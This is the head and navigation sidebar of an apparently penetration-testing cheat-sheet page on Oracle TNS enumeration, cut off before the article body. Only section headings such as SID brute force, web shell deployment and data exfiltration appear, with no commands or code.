<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Professional penetration testing reference guides for systematic service discovery and exploitation"><meta name=author content="Security Professional"><link href=https://yourusername.github.io/service-enumeration/database/oracle-tns/ rel=canonical><link href=../mysql/ rel=prev><link href=../../mail/ rel=next><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.6.16"><title>Oracle TNS - Service Enumeration Cheat Sheets</title><link rel=stylesheet href=../../assets/stylesheets/main.7e37652d.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.06af60db.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../stylesheets/extra.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script id=__analytics>function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config",""),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script><script>"undefined"!=typeof __md_analytics&&__md_analytics()</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#oracle-tns-enumeration-cheat-sheet class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--shadow md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title="Service Enumeration Cheat Sheets" class="md-header__button md-logo" aria-label="Service Enumeration Cheat Sheets" data-md-component=logo> <img src=../../assets/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Service Enumeration Cheat Sheets </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Oracle TNS </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media=(prefers-color-scheme) data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=blue-grey data-md-color-accent=deep-orange aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=blue-grey data-md-color-accent=deep-orange aria-label="Switch to system preference" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to system preference" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" title=Share aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/yourusername/service-enumeration title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill=currentColor d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> yourusername/service-enumeration </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../quick-start/ class=md-tabs__link> Quick Start </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../ class=md-tabs__link> Database Services </a> </li> <li class=md-tabs__item> <a href=../../mail/ class=md-tabs__link> Mail Services </a> </li> <li class=md-tabs__item> <a href=../../network/ class=md-tabs__link> Network Services </a> </li> <li class=md-tabs__item> <a href=../../file/ class=md-tabs__link> File Services </a> </li> <li class=md-tabs__item> <a href=../../resources/tools/ class=md-tabs__link> Resources </a> </li> <li class=md-tabs__item> <a href=../../contributing/ class=md-tabs__link> Contributing </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="Service Enumeration Cheat Sheets" class="md-nav__button md-logo" aria-label="Service Enumeration Cheat Sheets" data-md-component=logo> <img src=../../assets/logo.png alt=logo> </a> Service Enumeration Cheat Sheets </label> <div class=md-nav__source> <a href=https://github.com/yourusername/service-enumeration title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill=currentColor d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg> </div> <div class=md-source__repository> yourusername/service-enumeration </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class=md-nav__item> <a href=../../quick-start/ class=md-nav__link> <span class=md-ellipsis> Quick Start </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3 checked> <div class="md-nav__link md-nav__container"> <a href=../ class="md-nav__link "> <span class=md-ellipsis> Database Services </span> </a> <label class="md-nav__link " for=__nav_3 id=__nav_3_label tabindex> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=true> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Database Services </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../mysql/ class=md-nav__link> <span class=md-ellipsis> MySQL </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Oracle TNS </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Oracle TNS </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#table-of-contents class=md-nav__link> <span class=md-ellipsis> Table of Contents </span> </a> </li> <li class=md-nav__item> <a href=#overview class=md-nav__link> <span class=md-ellipsis> Overview </span> </a> <nav class=md-nav aria-label=Overview> <ul class=md-nav__list> <li class=md-nav__item> <a href=#key-functions class=md-nav__link> <span class=md-ellipsis> Key Functions </span> </a> </li> <li class=md-nav__item> <a href=#why-oracle-tns-matters-in-pentesting class=md-nav__link> <span class=md-ellipsis> Why Oracle TNS Matters in Pentesting </span> </a> </li> <li class=md-nav__item> <a href=#common-attack-vectors class=md-nav__link> <span class=md-ellipsis> Common Attack Vectors </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#ports-protocols class=md-nav__link> <span class=md-ellipsis> Ports &amp; Protocols </span> </a> <nav class=md-nav aria-label="Ports & Protocols"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#oracle-components class=md-nav__link> <span class=md-ellipsis> Oracle Components </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#quick-discovery class=md-nav__link> <span class=md-ellipsis> Quick Discovery </span> </a> </li> <li class=md-nav__item> <a href=#essential-enumeration-workflow class=md-nav__link> <span class=md-ellipsis> Essential Enumeration Workflow </span> </a> <nav class=md-nav aria-label="Essential Enumeration Workflow"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-service-detection class=md-nav__link> <span class=md-ellipsis> 1. Service Detection </span> </a> <nav class=md-nav aria-label="1. Service Detection"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#basic-oracle-tns-detection class=md-nav__link> <span class=md-ellipsis> Basic Oracle TNS Detection </span> </a> </li> <li class=md-nav__item> <a href=#alternative-port-discovery class=md-nav__link> <span class=md-ellipsis> Alternative Port Discovery </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-sid-enumeration class=md-nav__link> <span class=md-ellipsis> 2. SID Enumeration </span> </a> <nav class=md-nav aria-label="2. SID Enumeration"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#nmap-sid-brute-force class=md-nav__link> <span class=md-ellipsis> Nmap SID Brute Force </span> </a> </li> <li class=md-nav__item> <a href=#odat-sid-discovery class=md-nav__link> <span class=md-ellipsis> ODAT SID Discovery </span> </a> </li> <li class=md-nav__item> <a href=#manual-sid-testing class=md-nav__link> <span class=md-ellipsis> Manual SID Testing </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#3-authentication-testing class=md-nav__link> <span class=md-ellipsis> 3. Authentication Testing </span> </a> <nav class=md-nav aria-label="3. Authentication Testing"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#default-credentials-testing class=md-nav__link> <span class=md-ellipsis> Default Credentials Testing </span> </a> </li> <li class=md-nav__item> <a href=#odat-password-attacks class=md-nav__link> <span class=md-ellipsis> ODAT Password Attacks </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#4-database-interaction class=md-nav__link> <span class=md-ellipsis> 4. Database Interaction </span> </a> <nav class=md-nav aria-label="4. Database Interaction"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#basic-connection class=md-nav__link> <span class=md-ellipsis> Basic Connection </span> </a> </li> <li class=md-nav__item> <a href=#information-gathering class=md-nav__link> <span class=md-ellipsis> Information Gathering </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#manual-interaction class=md-nav__link> <span class=md-ellipsis> Manual Interaction </span> </a> <nav class=md-nav aria-label="Manual Interaction"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#sqlplus-connection class=md-nav__link> <span class=md-ellipsis> SQLPlus Connection </span> </a> <nav class=md-nav aria-label="SQLPlus Connection"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#connection-syntax class=md-nav__link> <span class=md-ellipsis> Connection Syntax </span> </a> </li> <li class=md-nav__item> <a href=#connection-troubleshooting class=md-nav__link> <span class=md-ellipsis> Connection Troubleshooting </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#oracle-sql-commands class=md-nav__link> <span class=md-ellipsis> Oracle SQL Commands </span> </a> <nav class=md-nav aria-label="Oracle SQL Commands"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#basic-information-queries class=md-nav__link> <span class=md-ellipsis> Basic Information Queries </span> </a> </li> <li class=md-nav__item> <a href=#user-and-privilege-enumeration class=md-nav__link> <span class=md-ellipsis> User and Privilege Enumeration </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#system-information-queries class=md-nav__link> <span class=md-ellipsis> System Information Queries </span> </a> <nav class=md-nav aria-label="System Information Queries"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#database-schema-enumeration class=md-nav__link> <span class=md-ellipsis> Database Schema Enumeration </span> </a> </li> <li class=md-nav__item> <a href=#sensitive-data-discovery class=md-nav__link> <span class=md-ellipsis> Sensitive Data Discovery </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#credential-attacks class=md-nav__link> <span class=md-ellipsis> Credential Attacks </span> </a> <nav class=md-nav aria-label="Credential Attacks"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#brute-force-attacks class=md-nav__link> <span class=md-ellipsis> Brute Force Attacks </span> </a> <nav class=md-nav aria-label="Brute Force Attacks"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#hydra class=md-nav__link> <span class=md-ellipsis> Hydra </span> </a> </li> <li class=md-nav__item> <a href=#custom-oracle-brute-force-script class=md-nav__link> <span class=md-ellipsis> Custom Oracle Brute Force Script </span> </a> </li> <li class=md-nav__item> <a href=#odat-comprehensive-testing class=md-nav__link> <span class=md-ellipsis> ODAT Comprehensive Testing </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#advanced-techniques class=md-nav__link> <span class=md-ellipsis> Advanced Techniques </span> </a> <nav class=md-nav aria-label="Advanced Techniques"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#password-hash-extraction class=md-nav__link> <span class=md-ellipsis> Password Hash Extraction </span> </a> <nav class=md-nav aria-label="Password Hash Extraction"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#extract-user-hashes class=md-nav__link> <span class=md-ellipsis> Extract User Hashes </span> </a> </li> <li class=md-nav__item> <a href=#hash-cracking class=md-nav__link> <span class=md-ellipsis> Hash Cracking </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#file-system-operations class=md-nav__link> <span class=md-ellipsis> File System Operations </span> </a> <nav class=md-nav aria-label="File System Operations"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#file-upload-via-utl_file class=md-nav__link> <span class=md-ellipsis> File Upload via UTL_FILE </span> </a> </li> <li class=md-nav__item> <a href=#odat-file-operations class=md-nav__link> <span class=md-ellipsis> ODAT File Operations </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#java-stored-procedures class=md-nav__link> <span class=md-ellipsis> Java Stored Procedures </span> </a> <nav class=md-nav aria-label="Java Stored Procedures"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#execute-system-commands class=md-nav__link> <span class=md-ellipsis> Execute System Commands </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#odat-framework class=md-nav__link> <span class=md-ellipsis> ODAT Framework </span> </a> <nav class=md-nav aria-label="ODAT Framework"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#installation-and-setup class=md-nav__link> <span class=md-ellipsis> Installation and Setup </span> </a> </li> <li class=md-nav__item> <a href=#odat-module-usage class=md-nav__link> <span class=md-ellipsis> ODAT Module Usage </span> </a> <nav class=md-nav aria-label="ODAT Module Usage"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#comprehensive-testing class=md-nav__link> <span class=md-ellipsis> Comprehensive Testing </span> </a> </li> <li class=md-nav__item> <a href=#specific-module-testing class=md-nav__link> <span class=md-ellipsis> Specific Module Testing </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#common-vulnerabilities class=md-nav__link> <span class=md-ellipsis> Common Vulnerabilities </span> </a> <nav class=md-nav aria-label="Common Vulnerabilities"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#default-credentials class=md-nav__link> <span class=md-ellipsis> Default Credentials </span> </a> </li> <li class=md-nav__item> <a href=#privilege-escalation class=md-nav__link> <span class=md-ellipsis> Privilege Escalation </span> </a> </li> <li class=md-nav__item> <a href=#information-disclosure class=md-nav__link> <span class=md-ellipsis> Information Disclosure </span> </a> </li> <li class=md-nav__item> <a href=#file-system-access class=md-nav__link> <span class=md-ellipsis> File System Access </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#quick-reference-commands class=md-nav__link> <span class=md-ellipsis> Quick Reference Commands </span> </a> <nav class=md-nav aria-label="Quick Reference Commands"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#discovery class=md-nav__link> <span class=md-ellipsis> Discovery </span> </a> </li> <li class=md-nav__item> <a href=#authentication class=md-nav__link> <span class=md-ellipsis> Authentication </span> </a> </li> <li class=md-nav__item> <a href=#enumeration class=md-nav__link> <span class=md-ellipsis> Enumeration </span> </a> </li> <li class=md-nav__item> <a href=#file-operations class=md-nav__link> <span class=md-ellipsis> File Operations </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#testing-checklist class=md-nav__link> <span class=md-ellipsis> Testing Checklist </span> </a> <nav class=md-nav aria-label="Testing Checklist"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#discovery-detection class=md-nav__link> <span class=md-ellipsis> Discovery &amp; Detection </span> </a> </li> <li class=md-nav__item> <a href=#sid-enumeration class=md-nav__link> <span class=md-ellipsis> SID Enumeration </span> </a> </li> <li class=md-nav__item> <a href=#authentication-testing class=md-nav__link> <span class=md-ellipsis> Authentication Testing </span> </a> </li> <li class=md-nav__item> <a href=#database-enumeration class=md-nav__link> <span class=md-ellipsis> Database Enumeration </span> </a> </li> <li class=md-nav__item> <a href=#file-system-testing class=md-nav__link> <span class=md-ellipsis> File System Testing </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#critical-security-issues class=md-nav__link> <span class=md-ellipsis> Critical Security Issues </span> </a> <nav class=md-nav aria-label="Critical Security Issues"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#default-credentials_1 class=md-nav__link> <span class=md-ellipsis> Default Credentials </span> </a> </li> <li class=md-nav__item> <a href=#sysdba-privilege-escalation class=md-nav__link> <span class=md-ellipsis> SYSDBA Privilege Escalation </span> </a> </li> <li class=md-nav__item> <a href=#file-system-access_1 class=md-nav__link> <span class=md-ellipsis> File System Access </span> </a> </li> <li class=md-nav__item> <a href=#information-disclosure_1 class=md-nav__link> <span class=md-ellipsis> Information Disclosure </span> </a> </li> <li class=md-nav__item> <a href=#network-exposure class=md-nav__link> <span class=md-ellipsis> Network Exposure </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#common-oracle-sids class=md-nav__link> <span class=md-ellipsis> Common Oracle SIDs </span> </a> <nav class=md-nav aria-label="Common Oracle SIDs"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#default-sids class=md-nav__link> <span class=md-ellipsis> Default SIDs </span> </a> </li> <li class=md-nav__item> <a href=#enterprise-sids class=md-nav__link> <span class=md-ellipsis> Enterprise SIDs </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#default-oracle-accounts class=md-nav__link> <span class=md-ellipsis> Default Oracle Accounts </span> </a> <nav class=md-nav aria-label="Default Oracle Accounts"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#system-accounts class=md-nav__link> <span class=md-ellipsis> System Accounts </span> </a> </li> <li class=md-nav__item> <a href=#application-accounts class=md-nav__link> <span class=md-ellipsis> Application Accounts </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#oracle-configuration-files class=md-nav__link> <span class=md-ellipsis> Oracle Configuration Files </span> </a> <nav class=md-nav aria-label="Oracle Configuration Files"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#tns-configuration class=md-nav__link> <span class=md-ellipsis> TNS Configuration </span> </a> </li> <li class=md-nav__item> <a href=#common-paths class=md-nav__link> <span class=md-ellipsis> Common Paths </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#advanced-exploitation class=md-nav__link> <span class=md-ellipsis> Advanced Exploitation </span> </a> <nav class=md-nav aria-label="Advanced Exploitation"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#web-shell-deployment class=md-nav__link> <span class=md-ellipsis> Web Shell Deployment </span> </a> </li> <li class=md-nav__item> <a href=#persistence-techniques class=md-nav__link> <span class=md-ellipsis> Persistence Techniques </span> </a> </li> <li class=md-nav__item> <a href=#data-exfiltration class=md-nav__link> <span class=md-ellipsis> Data Exfiltration </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../mail/ class=md-nav__link> <span class=md-ellipsis> Mail Services </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../network/ class=md-nav__link> <span class=md-ellipsis> Network Services </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../file/ class=md-nav__link> <span class=md-ellipsis> File Services </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../resources/tools/ class=md-nav__link> <span class=md-ellipsis> Resources </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class=md-nav__item> <a href=../../contributing/ class=md-nav__link> <span class=md-ellipsis> Contributing </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/yourusername/service-enumeration/edit/main/docs/database/oracle-tns.md title="Edit this page" class="md-content__button md-icon" rel=edit> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg> </a> <a href=https://github.com/yourusername/service-enumeration/raw/main/docs/database/oracle-tns.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 